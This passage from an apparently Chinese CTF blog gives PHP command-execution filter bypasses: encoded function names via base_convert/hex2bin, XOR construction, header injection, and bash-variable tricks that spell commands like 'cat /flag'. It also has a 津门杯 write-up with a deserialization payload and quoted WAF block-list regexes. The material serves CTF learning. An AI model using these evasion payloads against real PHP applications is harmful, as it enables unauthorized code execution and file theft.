class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">PHP函数：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">()</span></span> 函数：在任意进制之间转换数字。</span><br><span class="line"><span class="function"><span class="title">dechex</span><span class="params">()</span></span> 函数：把十进制转换为十六进制。</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">()</span></span> 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> ：函数用于输出变量的相关信息。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br><span class="line">语法：readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>


<h2 id="数学函数利用"><a href="#数学函数利用" class="headerlink" title="数学函数利用"></a>数学函数利用</h2><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=&lt;command&gt;</span><br></pre></td></tr></table></figure>
<p><strong>分析</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="variable">$pi</span>=hex2bin(<span class="string">&quot;5f474554&quot;</span>) =&gt; <span class="variable">$pi</span>=<span class="string">&quot;_GET&quot;</span>   <span class="regexp">//</span>hex2bin将一串<span class="number">16</span>进制数转换为二进制字符串($<span class="variable">$pi</span>)&#123;pi&#125;(($<span class="variable">$pi</span>)&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>)&#123;pi&#125;((<span class="variable">$_GET</span>)&#123;abs&#125;) <span class="regexp">//</span>&#123;&#125;可以代替[]</span><br></pre></td></tr></table></figure>


<h2 id="HeaderRCE"><a href="#HeaderRCE" class="headerlink" title="HeaderRCE"></a>HeaderRCE</h2><blockquote>
<p>getallheaders — 获取全部 HTTP 请求头信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56-2.jpg"></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert,<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">然后抓包在请求头中添加 <span class="number">1</span>：cat /flag</span><br></pre></td></tr></table></figure>
<p>分析</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)</span></span> =&gt; <span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">&quot;getallheaders&quot;</span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(getallheaders()</span></span>&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>


<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;       &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在运行结果中找到_GET即可，构造payload</p>
<blockquote>
<p>is_nan^64==&gt;_G</p>
<p>tan^15==&gt;ET</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>


<h1 id="Linux中内置的bash变量"><a href="#Linux中内置的bash变量" class="headerlink" title="Linux中内置的bash变量"></a>Linux中内置的bash变量</h1><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"> 构造nl flag.php</span><br><span class="line"> <span class="symbol">payload:</span><span class="variable">$&#123;</span><span class="symbol">PATH:</span><span class="number">14</span><span class="symbol">:</span><span class="number">1</span>&#125;<span class="variable">$&#123;</span><span class="symbol">PATH:</span><span class="number">5</span><span class="symbol">:</span><span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">过滤了数字时：<span class="symbol">payload:</span><span class="variable">$&#123;</span><span class="symbol">PATH:</span>~A&#125;<span class="variable">$&#123;</span><span class="symbol">PWD:</span>~A&#125; <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br></pre></td></tr></table></figure>


<p> $PATH的最后一位是n $PWD的最后一位 也就是 /var/www/html的最后一位是l<br>在linux中可以用<del>获取变量的最后几位，而字母起到的作用是和0相同的，所有${PATH:</del>A}其实就是${PATH:~0}</p>
<p><img src="http://img.npfs06.top/20210225143606.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="过滤了path时"><a href="#过滤了path时" class="headerlink" title="过滤了path时"></a>过滤了path时</h2><figure class="highlight smalltalk"><table><tr><td class="code"><pre><span class="line">构造 /bin/base64 flag.php </span><br><span class="line"></span><br><span class="line">payload: <span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;???<span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;?????<span class="string">$&#123;</span><span class="symbol">#RANDOM</span>&#125; ????.???</span><br></pre></td></tr></table></figure>
<p>需要/和4两个字符就行，其他的可以用通配符代替</p>
<p>/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的<code>$&#123;#SHLVL&#125;`绕过：

> SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。

只需要`$&#123;PWD::$&#123;SHLVL&#125;&#125;</code>，结果就是<code>/</code></p>
<p>还有一个4的问题，可以用<code>$&#123;#RANDOM&#125;</code>，在Linux中，<code>$&#123;#xxx&#125;</code>显示的是这个值的位数，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.</p>
<p><img src="http://img.npfs06.top/20210225150320.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight smalltalk"><table><tr><td class="code"><pre><span class="line">构造 /bin/cat flag.php </span><br><span class="line"></span><br><span class="line">paylaod:  <span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;???<span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125;??<span class="string">$&#123;</span><span class="type">HOME</span>:<span class="string">$&#123;</span><span class="symbol">#HOSTNAME</span>&#125;:<span class="string">$&#123;</span><span class="symbol">#SHLVL</span>&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>


<p>构造<code>/bin/cat flag.php</code>,需要t和/，<code>$&#123;HOME&#125;</code>默认是<code>/root</code>，所以需要得到他的最后一个字母，容器的hostname为4个字母，所以<code>$&#123;#HOSTNAME&#125;</code>可以从第5位开始，1还是用<code>$&#123;#SHLVL&#125;</code>代替</p>
<h2 id="过滤了SHLVL时"><a href="#过滤了SHLVL时" class="headerlink" title="过滤了SHLVL时"></a>过滤了SHLVL时</h2><figure class="highlight smalltalk"><table><tr><td class="code"><pre><span class="line">payload: <span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span>#?&#125;&#125;???<span class="string">$&#123;</span><span class="type">PWD</span>::<span class="string">$&#123;</span>#?&#125;&#125;?????<span class="string">$&#123;</span><span class="symbol">#RANDOM</span>&#125; ????.???</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 过滤模板</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br></pre></td></tr></table></figure>


<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$?</span></span><br><span class="line">用途：上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。</span><br></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@npfs</span><span class="symbol">:~</span><span class="comment"># echo $&#123;#?&#125;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤了-和PWD时"><a href="#过滤了-和PWD时" class="headerlink" title="过滤了#和PWD时"></a>过滤了#和PWD时</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&gt;<span class="symbol">payload:</span> &lt;A;<span class="variable">$&#123;</span>HOME::<span class="variable">$?</span>&#125;<span class="string">??</span><span class="string">?$</span>&#123;HOME::<span class="variable">$?</span>&#125;<span class="string">??</span><span class="string">??</span><span class="string">?$</span>&#123;RANDOM::<span class="variable">$?</span>&#125; <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 过滤模板</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br></pre></td></tr></table></figure>


<p>PWD过滤了可以用HOME代替，<code>$&#123;HOME&#125;</code>默认是<code>/root</code>，接下去我们只要再找到<code>1</code>来代替<code>$&#123;#SHLVL&#125;</code></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$?</span></span><br><span class="line">执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</span><br></pre></td></tr></table></figure>
<p>fuzz下发现题目没有过滤<code>&lt;</code>，所以我们利用<code>&lt;A;</code>报错。从而使<code>$?</code>返回值为1</p>
<hr>
<p>例子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; c=highlight_file(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">&gt; c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line">&gt; system(<span class="string">&#x27;ca&quot;&quot;t config.php&#x27;</span>)</span><br><span class="line">&gt; system(<span class="string">&quot;ca&#x27;&#x27;t config.php&quot;</span>)</span><br><span class="line">&gt; c=passthru(<span class="string">&quot;ca&#x27;&#x27;t \`ls\`&quot;</span>);</span><br><span class="line">&gt; c=<span class="variable">$a</span> = base64_decode(<span class="string">&#x27;c3lzdGVt&#x27;</span>);<span class="variable">$b</span>=base64_decode(<span class="string">&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line">&gt; c=passthru(<span class="string">&quot;ca&#x27;&#x27;t \`ls\`&quot;</span>)?&gt;</span><br><span class="line">&gt; c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;</span><br><span class="line"></span><br><span class="line">&gt; ?c=<span class="built_in">echo</span> `<span class="variable">$_POST</span>[1]`?&gt;</span><br><span class="line">&gt; post: 1=cat config.php</span><br><span class="line"></span><br><span class="line">&gt;?c=grep<span class="variable">$&#123;IFS&#125;</span>%27&#123;%27<span class="variable">$&#123;IFS&#125;</span>fl???php</span><br><span class="line">意思就是在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行</span><br><span class="line">&gt; ?c=/???/????64%20????.???</span><br></pre></td></tr></table></figure>


<blockquote>
<p>文章中例题多来源于CTFshow web入门板块</p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>津门杯</title>
    <url>/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AF/</url>
    <content><![CDATA[<p>津门杯write up，第11名<br>呜呜呜 , 还是太菜了，全靠队友带飞 狮虎门tqlllll<a id="more"></a></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p>index.php.swp源码泄露</p>
<p>整理得到如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// initialise variables</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反序列：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> weblog();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//system(&#x27;cat /flag&#x27;)O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flag&quot;;&#125;this is destruct</span></span><br></pre></td></tr></table></figure>
<p>由于<code>$log = str_replace(&#39;flag&#39;,&#39;&#39;,$log);</code>这里过滤了flag，尝试双写绕过</p>
<p><img src="http://img.npfs06.top/20210510183630.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210511125810.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="UploadHUb"><a href="#UploadHUb" class="headerlink" title="UploadHUb"></a>UploadHUb</h2><p>上传文件后发现，不解析php文件，去看配置文件</p>
<p><img src="http://img.npfs06.top/20210513210353.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<blockquote>
<p>Apache会优先处理<Directory>容器（但是不会处理带有正则表达式的<Directory>容器）和.htaccess文件，如果.htaccess文件与<Directory>容器有冲突，则以htaccess文件内容来覆盖<Directory>容器中冲突的部分，随后Apache会处理<DirectoryMatch>与<Directory>，再接着处理<Files>和<FilesMatch>容器，最后处理<Location>和<LocationMatch>容器。</LocationMatch></Location></FilesMatch></Files></Directory></DirectoryMatch></Directory></Directory></Directory></Directory></p>
</blockquote>
<p>所以考察点其实就是.htaccess利用</p>
<p><img src="http://img.npfs06.top/20210511212031.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>disable_function过滤如下</p>
<blockquote>
